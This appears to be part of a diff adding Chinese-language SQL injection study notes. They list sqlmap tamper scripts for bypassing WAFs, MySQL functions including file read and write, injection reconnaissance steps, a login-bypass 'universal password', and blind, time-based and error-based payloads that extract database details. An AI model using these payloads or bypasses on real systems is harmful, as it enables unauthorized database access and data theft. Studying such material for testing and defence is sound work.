+9    charencode    将url编码  
+10    charunicodeencode    使用unicode编码  
+11    charunicodeescape    以指定的payload反向编码未编码的字符 
+12    commalesslimit    改变limit语句的写法  
+13    commalessmid    改变mid语句的写法  
+14    commentbeforeparentheses    在括号前加内联注释  
+15    concat2concatws    替换CONCAT为CONCAT_WS  
+16    equaltolike    等号替换为like  
+17    escapequotes    双引号替换为\\\\  
+18    greatest    大于号替换为greatest  
+19    halfversionedmorekeywords    在每个关键字前加注释  
+20    htmlencode    html编码所有非字母和数字的字符  
+21    ifnull2casewhenisnull    改变ifnull语句的写法  
+22    ifnull2ifisnull    替换ifnull为if(isnull(A))  
+23    informationschemacomment    标示符后添加注释  
+24    least    替换大于号为least  
+25    lowercase    全部替换为小写值  
+26    modsecurityversioned    空格替换为查询版本的注释  
+27    modsecurityzeroversioned    添加完整的查询版本的注释  
+28    multiplespaces    添加多个空格  
+29    nonrecursivereplacement    替换预定义的关键字  
+30    overlongutf8    将所有字符转义为utf8  
+31    overlongutf8more    以指定的payload转换所有字符  
+32    percentage    每个字符前添加%  
+33    plus2concat    将加号替换为concat函数  
+34    plus2fnconcat    将加号替换为ODBC函数{fn CONCAT()}  
+35    randomcase    字符大小写随机替换  
+36    randomcomments    /**/分割关键字  
+37    securesphere    添加某字符串  
+38    sp_password    追加sp_password字符串  
+39    space2comment    空格替换为/**/  
+40    space2dash    空格替换为–加随机字符  
+41    space2hash    空格替换为#加随机字符  
+42    space2morecomment    空格替换为/**_**/  
+43    space2morehash    空格替换为#加随机字符及换行符  
+44    space2mssqlblank    空格替换为其他空符号  
+45    space2mssqlhash    空格替换为%23%0A  
+46    space2mysqlblank    空格替换为其他空白符号  
+47    space2mysqldash    空格替换为–%0A  
+48    space2plus    空格替换为加号  
+49    space2randomblank    空格替换为备选字符集中的随机字符  
+50    symboliclogical    AND和OR替换为&&和||  
+51    unionalltounion    union all select替换为union select 
+52    unmagicquotes    宽字符绕过GPC  
+53    uppercase    全部替换为大写值  
+54    varnish    添加HTTP头  
+55    versionedkeywords    用注释封装每个非函数的关键字  
+56    versionedmorekeywords    使用注释绕过  
+57    xforwardedfor    添加伪造的HTTP头  
+
+常用系统函数——
+基础信息函数	功能
+system_user()	系统用户名
+user()	用户名
+current_user()	当前用户名
+session_user()	连接数据库的用户名
+database()	数据库名
+version()	数据库版本
+@@datadir	数据库路径
+@@basedir	数据库安装路径
+@@version_compile_os	操作系统
+count()	返回执行结果数量
+sleep()	不用解释
+常用其他函数：
+字符处理函数	功能	举例
+重点 concat()	没有分隔符地连接字符串	select concat(c1,c2) from xxx
+重点 concat_ws()	指定分隔符地连接字符串	select concat_ws(':',c1,c2) from xxx
+重点 group_concat()	以逗号分隔某列/组的数据	select group_concat(c1,c2) from xxx
+load_file()	读取服务器文件	select loadfile('/tmp/a.txt')
+into outfile	写入文件到服务器	select 'xxxx' into outfile '/tmp/a.txt'
+ascii()	字符串的ASCII代码值	select ascii('a')
+ord()	返回字符串第一个字符的ASCII值	select ord('abc')
+char()	返回ASCII值对应的字符串	select char(97)
+mid()	返回一个字符串的一部分	select mid('abcde',1,1)
+substr()	返回一个字符串的一部分	select substr('abcde',1,1)
+length()	返回字符串的长度	select length('abc')
+left()	返回字符串最左面几个字符	select left('mysql',2)
+floor()	返回小于或等于X的最大整数	select floor(5.1)
+rand()	返回0-1间的一个随机数	select rand()
+if()	三目运算	select if(1>2,'A','B')
+strcmp()	比较字符串ASCII大小	select strcmp('c','b')
+ifnull()	参数1为不null则返回参数1,否则参数2	select ifnull(null,2)
+
+注入步骤——
+1.确定Web应用程序所使用的技术
+可以考察Web页面的页脚,查看错误页面,检查页面源代码,或者使用诸如Nessus、AWVS、 APPSCAN等工具来进行刺探。
+2.确定所有可能的输入方式
+Web应用的用户输入方式比较多,其中一些用户输入方式是很明显的,如HTML表单；
+另外,攻击者可以通过隐藏的HTML表单输入、HTTP头部、cookies、甚至对用户不可见的后端AJAX请求来跟Web应用进行交互。
+一般来说,所有HTTP的GET和POST都应当作用户输入。
+为了找出一个Web应用所有可能的用户输入,我们可以求助于Web代理,如Burp等。
+3.查找可以用于注入的用户输入
+在找出所有用户输入方式后,就要对这些输入方式进行筛选,找出其中可以注入命令的那些输入方式。
+多多留意Web应用的错误页面
+通常只要带有输入提交的动态网页,并且动态网页访问数据库,都是潜在的探测点
+# 万能密码:
+'or '1'='1
+## 源语句：
+select * from user where name='xx' and pwd='hhh';
+## 目标语句：
+select * from user where name='' or '1'='1' and pwd='' or '1'='1'
+#注入语句样例
+and 1=2 union select 1,2,3 -- 
+select user() regexp '^ro'
+ascii(substr((select user()),1,1))=114
+if(ascii(substr((select user()),1,1))=114,0,sleep 5)
+ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=9
+updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+手工检测 SQL 注入点
+最常用的 SQL 注入点判断方法,是在网站中寻找如下形式的网页链接。
+http://www.xxxxx.com/xxx.asp?id=xx (ASP 注入)
+http://www.xxxxx.com/xxx.php?id=xx (php 注入)
+http://www.xxxxx.com/xxx.jsp?id=xx (jsp 注入)
+http://www.xxxxx.com/xxx.aspx?id=xx (aspx 注入)
+http://www.xxxxx.com/index.asp?id=8&page=99 （有多个参数,需要区分用哪个参数来验证注入）
+http://www.xxxxx.com/index/new/id/8 伪静态
+http://www.xxxxx.com/index/new/php-8.html 伪静态
+判断是否存在sql注入
+如何判断某个网页链接是否存在 SQL 注入漏洞呢?通常有两种检测方法。
+单引号法
+第一种检测 SQL 注入漏洞是否存在的方法是“单引号”法。方法很简单,直接在浏览器地址栏中的网址链接后加上一个单引号,如果页面不能正常显示,浏览器返回一些异常信息, 则说明该链接可能存在注入漏洞。
+1=1 和 1=2 法
+很多时候检测提交包含引号的链接时,会提示非法字符,或直接不返回任何信息,这种情况下可以如下尝试：
+#先在链接地址后加上 and 1=1,提交
+xxx.com/xx.php?id=xx and 1=1
+#再替换为and 1=2,提交
+xxx.com/xx.php?id=xx and 1=2
+#如果返回不同的页面, 那么说明存在 SQL 注入漏洞。
+两种方法的组合变种
+'and 1=1 		/ and 1=2
+'and '1'='1 	/ and '1'='2
+'and 1 like 1	/ and 1 like 2
+更多方法组合的常用判断语句
+在插入的注入语句后面,增加-+或#,用以注释掉后面的正常语句
+#有时会被过滤,因此可以使用url编码,将#表文%23
+单引号也有可能会被过滤,可以换成双引号
+可以在引号后加一两个括号,用以实现可能的语句闭合,如
+or 1=1–+
+or 1=1#
+or 1=1%23
+'or 1=1–+
+"or 1=1–+
+)or 1=1–+
+')or 1=1–+
+") or 1=1–+
+"))or 1=1–+
+ASP和PHP中的调用函数
+# ASP
+request （全部接受）
+request.querystring （接受 get）
+request.form （接受 post）
+request.cookie（接受 cookie）
+# PHP:
+$_REQUEST（全部接受）
+$_GET(接受get)
+$_POST （接受 post）
+$_COOKIE（接受 cookie） 
+#一般中间件 waf 防火墙,对get防护最高,其次是post,最后是cookie  
+#很多人在写注入防御代码时,写了post、get的,但是没有过滤cookie的
